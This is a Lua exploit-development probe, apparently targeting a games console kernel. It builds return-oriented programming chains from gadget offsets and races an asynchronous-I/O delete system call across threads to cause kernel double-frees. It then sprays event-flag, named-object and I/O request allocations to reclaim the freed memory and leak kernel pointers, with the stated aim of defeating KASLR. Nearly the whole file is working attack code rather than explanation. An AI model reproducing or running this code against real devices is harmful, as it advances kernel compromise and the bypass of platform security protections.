-- CRASH_CLASS: HIGH
-- PROBE 65v: Cross-subsystem overlap detection via EVF objects
--
-- 65s-65u: massive double-frees confirmed but zero observable corruption
-- through AIO's own API (delete handler is resilient, NULL checks prevent
-- crashes). New approach: use EVENT FLAG objects (evf_create 538) as a
-- cross-subsystem read-back channel.
--
-- Theory: AIO sub-objects (48B, 40B, 56B) go to malloc's 64-byte zone.
-- EVF structs may also land in the 64-byte zone. After double-free:
-- - AIO spray reclaims one copy (fills slots with kernel pointers)
-- - EVF spray reclaims the other copy (same physical addresses)
-- - evf_tryWait reads "flag value" from memory shared with AIO sub-object
-- - If flag value contains kernel pointer → KASLR defeated
--
-- Also tests: namedobj(557) as alternative spray, and per-request unique
-- buffers for direct AIO corruption detection.

print("=== PROBE 65v: cross-subsystem overlap ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x1000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

if not alive() then print("DEAD after setup"); return end

-- =========================================================
-- [A] EVF functionality test
-- =========================================================
print("")
print("[A] EVF create/set/tryWait/delete test")

local evf_result = memory.alloc(16)

-- Try anonymous EVF (name=0, attr=0)
local evf_h = sgn(mk(538)(uint64(0), uint64(0)))
print("  evf_create(0, 0) = " .. evf_h)

if evf_h < 0 then
    -- Try with attribute 0x100
    evf_h = sgn(mk(538)(uint64(0), uint64(0x100)))
    print("  evf_create(0, 0x100) = " .. evf_h)
end

if evf_h < 0 then
    -- Try with a name
    local ename = put_str("test_evf_01")
    evf_h = sgn(mk(538)(uint64(N(ename)), uint64(0x100)))
    print("  evf_create(name, 0x100) = " .. evf_h)
end

local evf_works = false
if evf_h >= 0 then
    -- Set bits 0xDEAD
    local sr = sgn(mk(543)(uint64(evf_h), uint64(0xDEAD)))
    print("  evf_set(0xDEAD) = " .. sr)

    -- tryWait: pattern=0xFFFFFFFF, mode=1 (any), result buffer
    wq(N(evf_result), uint64(0))
    local wr = sgn(mk(546)(uint64(evf_h), uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_result))))
    local rv = rq(N(evf_result))
    print("  evf_tryWait = " .. wr .. "  flags=" .. fmt(rv))

    if wr >= 0 then
        local rv_lo = N(rv)
        if rv_lo == 0xDEAD or rv_lo == 0 then
            evf_works = true
            print("  EVF WORKS — read back matches or zeroed")
        else
            print("  EVF returned unexpected value: " .. fmt(rv))
            evf_works = true  -- still readable
        end
    end

    -- Delete
    local dr = sgn(mk(539)(uint64(evf_h)))
    print("  evf_delete = " .. dr)
else
    print("  EVF creation FAILED — trying namedobj only")
end

if not alive() then print("DEAD after EVF test"); return end

-- =========================================================
-- [B] Namedobj as spray alternative
-- =========================================================
print("")
print("[B] Namedobj spray sizing test")

-- Create 32 namedobjs with 48-char names (+ NUL = 49 bytes → 64-byte zone)
local no_handles = {}
for i = 1, 32 do
    local name = string.format("SPRAY_%04d_AABBCCDDEE1122334455667788990011", i)
    local np = put_str(name)
    local h = sgn(mk(557)(uint64(N(np)), uint64(0)))
    if h >= 0 then table.insert(no_handles, h) end
end
print("  namedobj created: " .. #no_handles)

-- Delete them
for _, h in ipairs(no_handles) do
    pcall(function() mk(558)(uint64(h)) end)
end
print("  namedobj deleted")

if not alive() then print("DEAD after namedobj test"); return end

-- =========================================================
-- [C] Double-free + unique-buffer AIO spray
--     Check per-request result words for anomalies
-- =========================================================
print("")
print("[C] Double-free + unique per-request buffers")

local BATCH = 48
local SPRAY = 128

-- Allocate per-request unique buffers
local ubuf_base = memory.alloc(SPRAY * 64)  -- 64 bytes per request for data
local ures_base = memory.alloc(SPRAY * 16)  -- 16 bytes per request for result

local del_ids = memory.alloc(4 * BATCH + 0x10)
local stChild = memory.alloc(4 * BATCH + 0x10)
local stMain  = memory.alloc(4 * BATCH + 0x10)
local markerC = memory.alloc(8)

for trial = 1, 5 do
    if not alive() then print("  trial " .. trial .. ": DEAD"); break end

    -- Submit + poll victims
    local vids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 16 then
        print(string.format("  trial %d: only %d victims", trial, vc))
        break
    end

    -- Write shared ID array for race
    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    -- Build child ROP chain for 662 race
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
    wq(N(par) + 0x30, tid_p)

    -- Race!
    pcall(function() mk(455)(par, uint64(0x38)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d → DEAD", trial, doubles))
        break
    end

    -- Spray with UNIQUE per-request buffers
    -- Each request gets its own data buffer (sentinel 0xAA) and result buffer (sentinel 0xBEEF)
    local spray_ids = {}
    for i = 1, SPRAY do
        local ub = N(ubuf_base) + (i - 1) * 64
        local ur = N(ures_base) + (i - 1) * 16
        -- Fill data buffer with per-request sentinel
        for j = 0, 60, 4 do wd(ub + j, 0xAAAA0000 + i) end
        -- Fill result buffer with sentinel
        wq(ur, uint64(0xBEEFBEEF))
        wq(ur + 8, uint64(0xBEEFBEEF))

        -- Submit with unique buffers
        wq(N(reqs_b), uint64(0))
        wq(N(reqs_b) + 8, uint64(16))  -- read 16 bytes
        local bh2, bl2 = get_hi_lo(uint64(ub))
        wd(N(reqs_b) + 0x10, bl2); wd(N(reqs_b) + 0x14, bh2)
        local rh2, rl2 = get_hi_lo(uint64(ur))
        wd(N(reqs_b) + 0x18, rl2); wd(N(reqs_b) + 0x1C, rh2)
        wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
        wd(N(one_id), 0)
        pcall(function()
            mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
        end)
        local id = rd(N(one_id)) or 0
        if id ~= 0 then
            poll_one(id)
            table.insert(spray_ids, {id = id, buf_addr = ub, res_addr = ur, idx = i})
        end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d spray=%d → DEAD after spray",
            trial, doubles, #spray_ids))
        break
    end

    -- CHECK 1: Read result words — should be 16 (bytes read from /dev/zero)
    local wrong_result = 0
    local kptr_result = 0
    for _, s in ipairs(spray_ids) do
        local res_lo = rd(s.res_addr) or 0
        local res_hi = rd(s.res_addr + 4) or 0
        -- Normal: result = 16 (0x10)
        if res_lo ~= 16 and res_lo ~= 0xBEEFBEEF then
            wrong_result = wrong_result + 1
            if res_hi >= 0xFFFF8000 then
                kptr_result = kptr_result + 1
                print(string.format("    KPTR in result! idx=%d val=0x%08X%08X",
                    s.idx, res_hi, res_lo))
            end
        end
    end

    -- CHECK 2: Read data buffers — should be zeros (from /dev/zero)
    local wrong_data = 0
    local kptr_data = 0
    for _, s in ipairs(spray_ids) do
        -- Check first 16 bytes (should be 0 from /dev/zero read)
        for off2 = 0, 12, 4 do
            local dv = rd(s.buf_addr + off2) or 0
            if dv ~= 0 then
                wrong_data = wrong_data + 1
                local dv_hi = rd(s.buf_addr + off2 + 4) or 0
                if dv_hi >= 0xFFFF8000 then
                    kptr_data = kptr_data + 1
                    print(string.format("    KPTR in data! idx=%d off=%d val=0x%08X%08X",
                        s.idx, off2, dv_hi, dv))
                end
                break  -- one per request
            end
        end
        -- Check bytes 16-63 (should still be sentinel 0xAAAAxxxx)
        local sentinel_ok = true
        for off2 = 16, 60, 4 do
            local sv = rd(s.buf_addr + off2) or 0
            if sv ~= 0xAAAA0000 + s.idx then
                sentinel_ok = false
                break
            end
        end
        if not sentinel_ok then wrong_data = wrong_data + 1 end
    end

    -- CHECK 3: Delete first half, then check if second half status changed
    local half = math.floor(#spray_ids / 2)
    local del_half = memory.alloc(4 * half + 4)
    local st_half  = memory.alloc(4 * half + 4)
    for i = 1, half do
        wd(N(del_half) + (i - 1) * 4, spray_ids[i].id)
        wd(N(st_half) + (i - 1) * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(del_half)), uint64(half), uint64(N(st_half)))
    end)

    if not alive() then
        print(string.format("  trial %d: dbl=%d DEAD on half-delete!", trial, doubles))
        break
    end

    -- Now delete second half one-by-one — watch for failures
    local h2_ok = 0
    local h2_fail = 0
    local h2_weird = 0
    for i = half + 1, #spray_ids do
        if not alive() then h2_fail = h2_fail + 1; break end
        wd(N(one_id), spray_ids[i].id)
        wd(N(one_st), 0xDEAD)
        pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local st = rd(N(one_st)) or 0xDEAD
        if st == 0 then h2_ok = h2_ok + 1
        elseif st == 0x80020003 then h2_fail = h2_fail + 1
        else h2_weird = h2_weird + 1 end
    end

    print(string.format(
        "  trial %d: dbl=%d spray=%d wr=%d kr=%d wd=%d kd=%d h2=%d/%d/%d",
        trial, doubles, #spray_ids,
        wrong_result, kptr_result, wrong_data, kptr_data,
        h2_ok, h2_fail, h2_weird))

    if not alive() then break end
end

if not alive() then
    print("  DEAD — skipping remaining sections")
    print("=== PROBE 65v COMPLETE ===")
    return
end

-- =========================================================
-- [D] Double-free + EVF cross-subsystem spray
-- =========================================================
print("")
if not evf_works then
    print("[D] SKIPPED — EVF not functional")
else
    print("[D] Double-free + EVF spray readback")

    for trial = 1, 5 do
        if not alive() then print("  trial " .. trial .. ": DEAD"); break end

        -- Submit + poll victims
        local vids = {}
        for i = 1, 48 do
            local id = submit_one()
            if id ~= 0 then poll_one(id); table.insert(vids, id) end
        end
        local vc = #vids
        if vc < 16 then break end

        for i = 0, vc - 1 do
            wd(N(del_ids) + i * 4, vids[i + 1])
            wd(N(stChild) + i * 4, 0xCCCCCCCC)
            wd(N(stMain) + i * 4, 0xDDDDDDDD)
        end
        wq(N(markerC), uint64(0))

        local stk = memory.alloc(0x4000)
        local sb = N(stk)
        local rsp2 = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
        local off2 = 0
        local function em2(v) wq(rsp2 + off2, v); off2 = off2 + 8 end
        em2(g_pop_rax); em2(uint64(0xCC))
        em2(g_pop_rdi); em2(uint64(N(markerC)))
        em2(g_mov_m_rax)
        em2(g_pop_rdi); em2(uint64(N(del_ids)))
        em2(g_pop_rsi); em2(uint64(vc))
        em2(g_pop_rdx); em2(uint64(N(stChild)))
        em2(g_pop_rax); em2(uint64(662))
        em2(stub)
        em2(g_pop_rax); em2(uint64(0xCD))
        em2(g_pop_rdi); em2(uint64(N(markerC)))
        em2(g_mov_m_rax)
        em2(g_pop_rdi); em2(uint64(0))
        em2(g_pop_rax); em2(uint64(431))
        em2(stub)

        local par = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
        wq(N(par), g_bare_ret)
        wq(N(par) + 0x10, uint64(sb))
        wq(N(par) + 0x18, uint64(0x2000))
        local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
        wq(N(par) + 0x30, tid_p)

        -- Race!
        pcall(function() mk(455)(par, uint64(0x38)) end)
        pcall(function()
            mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
        end)
        for w = 1, 50000 do local _ = rd(N(dbuf)) end

        local doubles = 0
        for i = 0, vc - 1 do
            local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
            local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
            if sM == 0 and sC == 0 then doubles = doubles + 1 end
        end

        if not alive() then
            print(string.format("  trial %d: dbl=%d → DEAD", trial, doubles))
            break
        end

        -- Phase 1: AIO spray (reclaim first copy from main thread cache)
        local aio_ids = {}
        for i = 1, 64 do
            local id = submit_one()
            if id ~= 0 then poll_one(id); table.insert(aio_ids, id) end
        end

        -- Phase 2: EVF spray (try to reclaim second copy)
        -- Create 256 EVFs with known bit patterns
        local evfs = {}
        for i = 1, 256 do
            if not alive() then break end
            local h = sgn(mk(538)(uint64(0), uint64(0)))
            if h < 0 then
                -- Retry with name
                local en = put_str(string.format("evf_%04d", i))
                h = sgn(mk(538)(uint64(N(en)), uint64(0x100)))
            end
            if h >= 0 then
                -- Set a known pattern: 0x12340000 + i
                pcall(function() mk(543)(uint64(h), uint64(0x12340000 + i)) end)
                table.insert(evfs, {handle = h, expected = 0x12340000 + i, idx = i})
            end
        end

        if not alive() then
            print(string.format("  trial %d: dbl=%d evfs=%d → DEAD after EVF spray",
                trial, doubles, #evfs))
            break
        end

        -- Phase 3: Read back EVF flags — check for corruption
        local evf_corrupted = 0
        local evf_kptr = 0
        local evf_zero = 0
        for _, e in ipairs(evfs) do
            if not alive() then break end
            wq(N(evf_result), uint64(0xCAFECAFE))
            local wr = sgn(mk(546)(uint64(e.handle), uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_result))))
            if wr >= 0 then
                local rv = rq(N(evf_result))
                local rv_lo = N(rv)
                local rv_hi, _ = get_hi_lo(rv)
                if rv_lo ~= e.expected then
                    if rv_lo == 0 or rv_lo == 0xCAFECAFE then
                        evf_zero = evf_zero + 1
                    else
                        evf_corrupted = evf_corrupted + 1
                        if rv_hi >= 0xFFFF8000 then
                            evf_kptr = evf_kptr + 1
                            print(string.format("    ★ KPTR in EVF! idx=%d expected=0x%X got=%s",
                                e.idx, e.expected, fmt(rv)))
                        elseif evf_corrupted <= 5 then
                            print(string.format("    EVF mismatch: idx=%d expected=0x%X got=%s",
                                e.idx, e.expected, fmt(rv)))
                        end
                    end
                end
            end
        end

        -- Cleanup EVFs
        for _, e in ipairs(evfs) do
            pcall(function() mk(539)(uint64(e.handle)) end)
        end
        -- Cleanup AIO
        local aio_del = memory.alloc(4 * #aio_ids + 4)
        local aio_st  = memory.alloc(4 * #aio_ids + 4)
        for i = 0, #aio_ids - 1 do
            wd(N(aio_del) + i * 4, aio_ids[i + 1])
            wd(N(aio_st) + i * 4, 0xDEAD)
        end
        pcall(function()
            mk(662)(uint64(N(aio_del)), uint64(#aio_ids), uint64(N(aio_st)))
        end)

        print(string.format(
            "  trial %d: dbl=%d evfs=%d corrupted=%d kptr=%d zero=%d",
            trial, doubles, #evfs, evf_corrupted, evf_kptr, evf_zero))

        if not alive() then break end
    end
end

if not alive() then
    print("")
    print("[E] SKIPPED — dead")
    print("=== PROBE 65v COMPLETE ===")
    return
end

-- =========================================================
-- [E] Interleaved AIO submit + EVF create after double-free
--     Maximize chance of cross-type overlap in same malloc bucket
-- =========================================================
print("")
if not evf_works then
    print("[E] SKIPPED — EVF not functional")
else
    print("[E] Interleaved AIO/EVF after double-free")

    for trial = 1, 5 do
        if not alive() then print("  trial " .. trial .. ": DEAD"); break end

        local vids = {}
        for i = 1, 64 do
            local id = submit_one()
            if id ~= 0 then poll_one(id); table.insert(vids, id) end
        end
        local vc = #vids
        if vc < 16 then break end

        for i = 0, vc - 1 do
            wd(N(del_ids) + i * 4, vids[i + 1])
            wd(N(stChild) + i * 4, 0xCCCCCCCC)
            wd(N(stMain) + i * 4, 0xDDDDDDDD)
        end
        wq(N(markerC), uint64(0))

        local stk = memory.alloc(0x4000)
        local sb = N(stk)
        local rsp3 = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
        local off3 = 0
        local function em3(v) wq(rsp3 + off3, v); off3 = off3 + 8 end
        em3(g_pop_rax); em3(uint64(0xCC))
        em3(g_pop_rdi); em3(uint64(N(markerC)))
        em3(g_mov_m_rax)
        em3(g_pop_rdi); em3(uint64(N(del_ids)))
        em3(g_pop_rsi); em3(uint64(vc))
        em3(g_pop_rdx); em3(uint64(N(stChild)))
        em3(g_pop_rax); em3(uint64(662))
        em3(stub)
        em3(g_pop_rax); em3(uint64(0xCD))
        em3(g_pop_rdi); em3(uint64(N(markerC)))
        em3(g_mov_m_rax)
        em3(g_pop_rdi); em3(uint64(0))
        em3(g_pop_rax); em3(uint64(431))
        em3(stub)

        local par = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
        wq(N(par), g_bare_ret)
        wq(N(par) + 0x10, uint64(sb))
        wq(N(par) + 0x18, uint64(0x2000))
        local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
        wq(N(par) + 0x30, tid_p)

        pcall(function() mk(455)(par, uint64(0x38)) end)
        pcall(function()
            mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
        end)
        for w = 1, 50000 do local _ = rd(N(dbuf)) end

        local doubles = 0
        for i = 0, vc - 1 do
            local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
            local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
            if sM == 0 and sC == 0 then doubles = doubles + 1 end
        end

        if not alive() then
            print(string.format("  trial %d: dbl=%d → DEAD", trial, doubles))
            break
        end

        -- Interleave: AIO submit, EVF create, AIO submit, EVF create...
        local aio_ids2 = {}
        local evfs2 = {}
        for i = 1, 128 do
            if not alive() then break end
            -- AIO submit
            local id = submit_one()
            if id ~= 0 then poll_one(id); table.insert(aio_ids2, id) end
            -- EVF create with unique pattern
            local h = sgn(mk(538)(uint64(0), uint64(0)))
            if h < 0 then
                local en = put_str(string.format("ie_%04d", i))
                h = sgn(mk(538)(uint64(N(en)), uint64(0x100)))
            end
            if h >= 0 then
                pcall(function() mk(543)(uint64(h), uint64(0xABCD0000 + i)) end)
                table.insert(evfs2, {handle = h, expected = 0xABCD0000 + i, idx = i})
            end
        end

        -- Read back ALL EVF flags
        local corrupted2 = 0
        local kptr2 = 0
        for _, e in ipairs(evfs2) do
            if not alive() then break end
            wq(N(evf_result), uint64(0xCAFECAFE))
            local wr = sgn(mk(546)(uint64(e.handle), uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_result))))
            if wr >= 0 then
                local rv = rq(N(evf_result))
                local rv_lo = N(rv)
                local rv_hi, _ = get_hi_lo(rv)
                if rv_lo ~= e.expected and rv_lo ~= 0 and rv_lo ~= 0xCAFECAFE then
                    corrupted2 = corrupted2 + 1
                    if rv_hi >= 0xFFFF8000 then
                        kptr2 = kptr2 + 1
                        print(string.format("    ★★ KPTR! idx=%d exp=0x%X got=%s",
                            e.idx, e.expected, fmt(rv)))
                    elseif corrupted2 <= 3 then
                        print(string.format("    mismatch: idx=%d exp=0x%X got=%s",
                            e.idx, e.expected, fmt(rv)))
                    end
                end
            end
        end

        -- Cleanup
        for _, e in ipairs(evfs2) do pcall(function() mk(539)(uint64(e.handle)) end) end
        local aio_del2 = memory.alloc(4 * #aio_ids2 + 4)
        local aio_st2  = memory.alloc(4 * #aio_ids2 + 4)
        for i = 0, #aio_ids2 - 1 do
            wd(N(aio_del2) + i * 4, aio_ids2[i + 1])
            wd(N(aio_st2) + i * 4, 0xDEAD)
        end
        pcall(function()
            mk(662)(uint64(N(aio_del2)), uint64(#aio_ids2), uint64(N(aio_st2)))
        end)

        print(string.format("  trial %d: dbl=%d aio=%d evf=%d corrupted=%d kptr=%d",
            trial, doubles, #aio_ids2, #evfs2, corrupted2, kptr2))

        if not alive() then break end
    end
end

print("")
print("=== PROBE 65v COMPLETE ===")
